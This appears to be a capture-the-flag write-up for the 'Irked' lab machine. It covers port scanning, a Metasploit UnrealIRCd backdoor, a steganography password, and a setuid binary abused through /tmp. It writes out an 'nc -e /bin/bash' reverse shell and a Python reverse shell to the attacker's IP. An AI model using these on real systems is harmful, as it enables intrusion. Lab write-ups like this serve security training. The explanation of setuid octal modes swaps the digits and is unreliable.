Irked is an easy-difficulty Linux machine that involves the exploitation of an IRC server using a public exploit, a bit of [steganography](https://en.wikipedia.org/wiki/Steganography), and the abuse of a far-from-functional custom binary owned by the `root` user of the system. Overall, the box is pretty straightforward, yet a lesson can be learned surrounding the dangers of the `setuid` bit being set when it shouldn't be. This machine is unique in the sense that upon gaining initial access to the system as the `www-data` user, it is possible (and arguably simpler) to elevate priveleges directly to the `root` user, bypassing the low privelege `djmardov` user and the related steganography puzzle entirely.

*Note: I completed this challenge on December 16th, 2018, however I'm just now writing it up in December 2019. As such, some of the details are sparse.*

## User
To begin the enumeration process, a port scan was run against the target using `masscan`. The purpose of this initial scan is to quickly determine which ports are open so that a more focused `nmap` scan can be performed that will target only the open ports discovered by `masscan`.

```
root@kali:~/workspace/hackthebox/Access# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.117
```

From `masscan`, it was revealed that a variety of ports were listening for connections, as shown in the command output below.

```
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 8067/tcp on 10.10.10.117                                  
Discovered open port 65534/tcp on 10.10.10.117                                 
Discovered open port 80/tcp on 10.10.10.117                                    
Discovered open port 111/tcp on 10.10.10.117                                   
Discovered open port 22/tcp on 10.10.10.117                                    
Discovered open port 50167/tcp on 10.10.10.117                                 
Discovered open port 6697/tcp on 10.10.10.117 
...
```

Using this information, a second scan was run using `nmap` to more thoughoughly examine the services listening on the discovered ports.

```
root@kali:~/workspace/hackthebox/Access# nmap -p 8067,65534,80,111,22,50167,6697 -sC -sV -oA scans/discovered-tcp 10.10.10.117
```

Note that while this scan is running, it's a good idea to check out what might be happening on well-known ports such as the HTTP port TCP 80. In this case, it appears the only item present on the webserver is the `irked.jpg` image which is shown below.

![irked_jpg.png](/assets/images/htb/irked/irked_jpg.png)

The results of the nmap scan revealed some interesting services listening on some uncommon ports, which suggest a good starting place for further enumeration. Note that in general, it is wise to take a broad approach during the initial enumeration process. That is to say that basic enumeration of each listening service should be completed before moving on to more focused enumeration of any particular service. In this write-up, the basic enumeration techniques are not discussed. A screenshot of the result of the nmap scan is shown below.

![nmapresults](/assets/images/htb/irked/nmapresults.png)

Of particular interest is the UnrealIRCd service running on TCP ports 6697, 8067, and 65534.

Using an IRC client such as `hexchat`, the IRC service listening on port 6697 can be accessed. If neccessary, `hexchat` can be installed using `apt-get install hexchat`. Upon connecting to the service, the server announces the running version of UnrealIRCd as 3.2.8.1. This is shown in the screenshot below.

![irc_version.png](/assets/images/htb/irked/irc_version.png)

Lesser-known and outdated services are often vulnerable to exploitation. The `searchsploit` tool can be used to search for exploits relevant to a given service. Now that the version of UnrealIRCd running on the target server is known, the command shown below can be used to search for vulnerabliities and exploits relevant to UnrealIRCd 3.2.8.1.

```
root@kali:~/workspace/hackthebox/Irked# searchsploit "UnrealIRCd 3.2.8.1"
```

The results of the search reveal that thare are a variety of exploits related to this version of UnrealIRCd, including a backdoor command exeuction Metasploit module.

![searchsploit_results](/assets/images/htb/irked/searchsploit_results.png)

The Metasploit Framework can be accessed via command line with the `msfconsole` command. Within `msfconsole`, the `exploit/unix/irc/unreal_ircd_3281_backdoor` module can be loaded and ran against the target using the options shown below.

![msfconsole_exploit.png](/assets/images/htb/irked/msfconsole_exploit.png)

Running this module with the `run` command results in a shell on the system as the `ircd` user. This session can be upgraded to a more stable shell by first connecting back to the attacking system once again, but this time outisde of `msfconsole`. In a new window on the attacking system, a listener should be set up before issuing the `nc -e /bin/bash 10.10.14.2 4444` command on the target system. From the session created over this connection, the shell can be upgraded, as demonstrated below.

![shell_upgrade.png](/assets/images/htb/irked/shell_upgrade.png)

In the `/home` directory of the target system there are two users; `ircd` and `djmardov`. The flag `user.txt` file is in the `/home/djamardov/Documents` directory, but cannot be read by the current `ircd` user. In this same directory, however, there is a file called `.backup`, the contents of which are shown below.

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

For those unfamiliar with steg, the word "steg" is short for "steganography" and is the practice of concealing a file, message, image, or video within another file, message, image or video. The contents of the `.backup` file in the home directory of `djmardov` suggets that there must be some information hidden in another file, and that `UPupDOWNdownLRlrBAbaSSss` must be the password to access the information.

A useful Linux tool for working with stegonagrphy is `steghide`. If necessary, this tool can be installed using `apt-get install steghide`. The `steghide` command shown below can be run against the `irked.jpg` image found on the webserver.

```
root@kali:~/workspace/hackthebox/Irked# steghide info irked.jpg
```

Upon running this command, the program prompts for a password, for which `UPupDOWNdownLRlrBAbaSSss` should be given, revealing the information shown below.

![steghide_info.png](/assets/images/htb/irked/steghide_info.png)

The embedded `pass.txt` file can be extracted with the following command.

```
root@kali:~/workspace/hackthebox/Irked# steghide extract -sf irked.jpg -p 
```

The `pass.txt` file can now be read and contains the data shown below.

```
Kab6h+m+bbp2J:HG
```

Returning to the target system, the password shown above can be used to switch to the `djmardov` user with the `su` command. The `user.txt` file can now be read.

![user_txt.png](/assets/images/htb/irked/user_txt.png)

## Root
With the password for `djmardov`, the target system can be accessed over SSH as the `djmardov` user. This provides for a cleaner experience as compared to the upgraded shell used up until this point.

To begin searching for misconfigurations that could lead to the elevation of priveleges, a search of the file system using `find` can be performed with the purpose of locating files owned by the `root` user that have the `setuid` bit set.

```
djmardov@irked:~$ find / -user root -perm -u=s 2> /dev/null
```

The `setuid` and `setgid` flags are Unix access rights flags that allow users to run programs with the permissions of the file's owner or group respectively. The `setuid` and `setgid` bits can be set by changing a file's mode with `chmod`. An octal file mode beginning with `2` (i.e. `chmod 4755 file.sh`) will set a file's `setuid` flag, and an octal file mode beginning with `4` (i.e. `chmod 2755 file.sh`) will set a file's `setgid` flag.

 Sometimes, a program owned by the `root` user that has the `setuid` bit set can be used to elevate privleges to `root`, since whenever the program is run it is run with `root` level permissions.  While it is common for certain programs owned by the `root` user to have the `setuid` flag set, it is important to keep an eye out for anything out of the ordinary.

The result of the aformentioned `find` command are shown in the image below.

![find_results.png](/assets/images/htb/irked/find_results.png)

Most of this looks normal, however the `/usr/bin/viewuser` program is not a standard `setuid` Linux binary. 

Running the `viewuser` binary displays some interesting output.

![viewuser_test.png](/assets/images/htb/irked/viewuser_test.png)

First of all, it appears that this is a custom binary that is still being developed. Secondly, it appears that the program attempts to interact with the `/tmp/listusers` file (which as suggested by the output does not exist). 

Knowing that `viewuser` is run with `root` permission and that it interacts with a nonexistent `listusers` file in the `/tmp` directory suggests a disasterous outcome, as the `/tmp` directory is world writable. This is to say that any user on the system can write to the `/tmp` directory, and therefore any user can create a `listusers` file.

To test whether the `viewuser` binary will execute code from within the `/tmp/listusers` file, a simple `ping` test can be performed. A `listusers` executable file can be written to the `/tmp` directory.

```
djmardov@irked:~$ echo "ping -c 5 10.10.14.2" > /tmp/listusers && chmod 755 /tmp/listusers
```

Next, the `tcpdump` tool can be run on the attacking system to confirm whether the target system is executing the `ping` command in the `/tmp/listusers` file.

```
root@kali:~/workspace/hackthebox/Irked# tcpdump -nni any icmp
```

The `viewuser` binary should be run again to test the `ping` command. The output on the attacking system from the `tcpdump` command confirms that the `viewuser` binary on the target system is executing shell commands in the `/tmp/listusers` file. At this point, the contents of the `/tmp/listusers` file can be replaced with a reverse shell. The Python reverse shell used for this is shown below.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

After setting up a listener on the attacking system, the `viewuser` binary should be run once again, resulting in a reverse shell as the `root` user of the target system.
